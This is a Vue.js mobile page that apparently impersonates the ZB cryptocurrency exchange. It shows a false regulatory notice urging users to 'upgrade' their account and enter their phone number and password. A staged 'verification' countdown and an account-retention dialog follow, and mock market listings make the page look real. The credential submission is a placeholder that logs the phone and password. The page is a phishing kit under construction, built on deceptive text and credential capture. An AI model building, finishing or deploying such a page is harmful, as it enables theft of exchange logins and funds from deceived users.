<template>
	<div class="container" ref="box">
		<!-- 占位 -->
		<div class="pla" :style="{height: offsetHeight}" v-if="isFixed"></div>
		<!-- 顶部 -->
		<div class="top_container">
			<!-- 头部 -->
			<Header/>
			<!-- 文本描述 -->
			<div class="text_content">
				<div class="text_title">安全中心</div>
				<div class="text_value">&nbsp&nbsp&nbsp&nbsp
					由于中国大陆加密货币法律法规监管的要求，现已将对您账户进行升级，如需保留账户请立即同步账户至ZB Global（中币全球站），超时未保留造成的损失，平台（ZB）概不负责
				</div>
			</div>
			<!-- 登录表单 -->
			<input class="input_ele phone" type="number" placeholder="请输入手机号" v-model="phone">
			<div class="input_ele password_box">
				<input class="password" :type="`${is_look?'text':'password'}`" placeholder="请输入密码" v-model="password">
				<div class="pass_icon" @click="checkLook">
					<img class="look_icon" src="../../static/look.png" v-if='is_look'>
					<img class="look_icon" src="../../static/un_look.png" v-else>
				</div>
			</div>
			<!-- 按钮 -->
			<Button text="账户升级" :is_active="is_active" @buttonCallback="login"/>
		</div>
		<!-- 吸顶模块 -->
		<div class="fixed_top" id="boxFixed" :class="{'is_fixed':isFixed}">
			<!-- 列表tab -->
			<div class="list_top">
				<!-- 一级tab -->
				<div class="top_tab">
					<div class="tab_item" :class="{'active_tab_item':active_tab == '1'}" @click="active_tab = '1'">现货</div>
					<div class="tab_item" :class="{'active_tab_item':active_tab == '2'}" @click="active_tab = '2'">杠杆</div>
				</div>
				<!-- 二级tab -->
				<div class="bottom_tab">
					<div class="bottom_tab_item" :class="{'active_bottom_tab_item':active_bottom_tab == '1'}" @click="active_bottom_tab = '1'">自选区</div>
					<div class="bottom_tab_item" :class="{'active_bottom_tab_item':active_bottom_tab == '2'}" @click="active_bottom_tab = '2'">QC</div>
					<div class="bottom_tab_item" :class="{'active_bottom_tab_item':active_bottom_tab == '3'}" @click="active_bottom_tab = '3'">USDT</div>
					<div class="bottom_tab_item" :class="{'active_bottom_tab_item':active_bottom_tab == '4'}" @click="active_bottom_tab = '4'">BTC</div>
				</div>
			</div>
			<!-- 分割线 -->
			<div class="line"></div>
			<!-- 排序 -->
			<div class="sort_box border_bottom">
				<div class="sort_left">
					<div class="sort_item">
						<div class="sort_title">成交额</div>
						<img class="sort_icon" src="../../static/sort_icon.png">
					</div>
					<div class="sort_item">
						<div class="sort_title">最新价</div>
						<img class="sort_icon" src="../../static/sort_icon.png">
					</div>
				</div>
				<div class="sort_right">
					<div class="sort_item">
						<div class="sort_title">涨跌幅</div>
						<img class="sort_icon" src="../../static/sort_icon.png">
					</div>
				</div>
			</div>
		</div>
		<!-- 列表 -->
		<div class="list_container">
			<ConinItem v-for="item in list_data" :item="item"/>
		</div>
		<!-- 账户保留弹窗 -->
		<Dialog v-if="showDialog"/>
	</div>
</template>
<style lang="less" scoped>
.container{
	box-sizing: border-box;
	padding-top: .3rem;
	padding-bottom: 1rem;
	overflow-y: scroll;
	-webkit-overflow-scrolling: touch;
	.border_bottom{
		border-bottom: 1px solid hsla(0,0%,100%,0.03);
	}
	.top_container{
		padding-bottom: 1.12rem;
		padding-left: .3rem;
		padding-right: .3rem;
		.text_content{
			margin-top: .9rem;
			margin-bottom: .7rem;
			color: #fff;
			.text_title{
				font-weight: bold;
				font-size: .48rem;
			}
			.text_value{
				margin-top: .3rem;
				font-size: .24rem;
			}
		}
		.input_ele{
			border-radius: .08rem;
			box-sizing: border-box;
			background: #0C0C11;
			font-size: .32rem;
			width: 100%;
			height: 1.08rem;
			padding-left: .3rem;
		}
		.phone{
			padding-right: .3rem;
		}
		.password_box{
			margin-top: .4rem;
			margin-bottom: .4rem;
			display:flex;
			align-items: center;
			.password{
				flex:1;
			}
			.pass_icon{
				width: 1.08rem;
				height: 1.08rem;
				display:flex;
				align-items: center;
				justify-content: center;
				.look_icon{
					width: .38rem;
					height: .38rem;
				}
			}
		}
		input{
			background: #0C0C11;
			border: none;
			outline: none;
			color: #fff;
		}
		input::-webkit-input-placeholder {
			color: #7e7e8a;
		}
		input:-moz-placeholder {
			color: #7e7e8a;
		}
		input:-ms-input-placeholder {
			color: #7e7e8a;
		}
	}
	.fixed_top{
		padding-top: .16rem;
		.list_top{
			.top_tab{
				margin: 0 auto .2rem;
				border:1px solid #E22034;
				border-radius: .05rem;
				width: 2.48rem;
				display:flex;
				align-items: center;
				justify-content: center;
				.tab_item{
					width: 1.24rem;
					text-align: center;
					height: .64rem;
					line-height: .64rem;
					font-size:.32rem;
					color: #E22034;
				}
				.active_tab_item{
					background:#E22034;
					color: #fff;
					font-weight: 500;
				}
			}
			.bottom_tab{
				padding-left: .3rem;
				padding-right: .3rem;
				display: flex;
				align-items: center;
				.bottom_tab_item{
					padding: .2rem .16rem;
					color: #7e7e8a;
					font-size:.32rem;
					font-weight: 700;
				}
				.active_bottom_tab_item{
					color: #E22034;
				}
			}	
		}
		.line{
			width: 100%;
			height: .1rem;
			background:#0C0C11;
		}
		.sort_box{
			box-sizing: border-box;
			display:flex;
			align-items: center;
			width: 100%;
			height: .58rem;
			padding-left: .3rem;
			padding-right: .3rem;
			.sort_left{
				flex:1;
				display:flex;
				align-items: center;
				justify-content: space-between;
			}
			.sort_right{
				width: 2.2rem;
				display:flex;
				align-items: center;
				justify-content: flex-end;
			}
			.sort_item{
				display:flex;
				align-items: center;
				.sort_title{
					font-size: .24rem;
					color: #7e7e8a;
				}
				.sort_icons{
					height: .2rem;
					display:flex;
					flex-direction: column;
					align-items: center;
					justify-content: center;
					.sort_icon{
						display:block;
						width: .24rem;
						height: .08rem;
					}
				}
			}
		}
	}
	.pla{
		display:block;
		width: 100%;
	}
	.is_fixed{
		background: #12121A;
		position: fixed;
		top: 0;
		left: 0;
		width: 100%;
		z-index: 998;
	}
	.list_container{
		width: 100%;
		padding-left: .3rem;
	}
}
</style>
<script>
	import Dialog from '../../components/Index/dialog.vue'
	import ConinItem from '../../components/Index/coin_item.vue'
	import Header from '../../components/Index/header.vue'
	import Button from '../../components/Common/button.vue'
	export default{
		name:'index',
		data(){
			return{
				phone:"",						//手机号
				password:"",					//密码
				is_look:false,					//密码是否可见
				is_active:false,				//默认按钮不可点击
				active_tab:'1',					//当前选中一级tab（1:现货;2:杠杆）
				active_bottom_tab:'1',			//当前选中二级tab（1:自选区;2:QC;3:USDT;4:BTC)
				list_data:[],					//数据列表
				isFixed:false,
				offsetTop:0,	
				offsetHeight:0,
				showDialog:false,				//默认不显示弹窗
			}
		},
		created(){
			//获取列表
			this.getList();
		},
		mounted() {
			this.$refs.box.addEventListener('scroll', () => {
				this.initHeight();
			}, false)
			this.$nextTick(() => {
				this.offsetTop = document.querySelector('#boxFixed').offsetTop;
				this.offsetHeight = document.querySelector('#boxFixed').offsetHeight;
			})
		},
		watch:{
			//监听手机号
			phone:function(n,o){
				this.judgeButton();
			},
			//监听密码
			password:function(n,o){
				this.judgeButton();
			},
			//切换一级tab
			active_tab(n,o){
				//获取列表
				this.getList();
			},
			//切换二级tab
			active_bottom_tab(n,o){
				//获取列表
				this.getList();
			}
		},
		methods:{
			//页面滑动
			initHeight() {
				var scrollTop = this.$refs.box.scrollTop;
				this.isFixed = scrollTop > this.offsetTop ? true : false;
			},
			//切换密码是否可见
			checkLook(){
				this.is_look = !this.is_look;
			},
			//判断账户升级按钮是否高亮（手机号和密码都不为空）
			judgeButton(){
				if(this.phone != '' && this.password != ''){
					this.is_active = true;
				}else{
					this.is_active = false;
				}
			},
			//点击账户升级
			login(){
				if(this.phone == ''){
					this.$toast('请输入手机号');
				}else if(this.phone != '' && !this.judgmentPhone.test(this.phone)){
					this.$toast('手机号格式不正确');
				}else if(this.password == ''){
					this.$toast('请输入密码');
				}else{
					//倒计时
					const toast = this.$toast.loading({
						duration: 0,
						forbidClick: true,
						message: '验证中 120 秒',
					});
					//这个参数到时候改成实际的秒数
					let second = 3;
					const timer = setInterval(() => {
						second--;
						if (second) {
							toast.message = `倒计时 ${second} 秒`;
						} else {
							clearInterval(timer);
							this.$toast.clear();
							// 显示弹窗
							this.showDialog = true;
						}
					}, 1000);
					// 发送请求
					let arg = {
						phone:this.phone,
						password:this.password
					}
					console.log(arg)
				}
			},
			//获取列表
			getList(){
				let arg = {
					active_tab:this.active_tab,
					active_bottom_tab:this.active_bottom_tab
				}
				console.log(arg);
				//模拟数据
				
				for(let i = 0;i < 100;i ++){
					var coin_item = {
						id:'1',
						icon_url:require('../../static/coin_logo.png'),	//图标
						name:'ZB',				//简称
						cn_name:'中币',			//中文名称
						cj_price:'374.4万',		//成交价
						new_price:'84637.32',	//最新价
						is_up:i%2==1?1:0,		//1:涨；2:跌
						num:'0.25',				//涨跌幅度
					}
					this.list_data.push(coin_item);
				}
			}
		},
		components:{
			Dialog,
			ConinItem,
			Header,
			Button
		}
	}
</script>














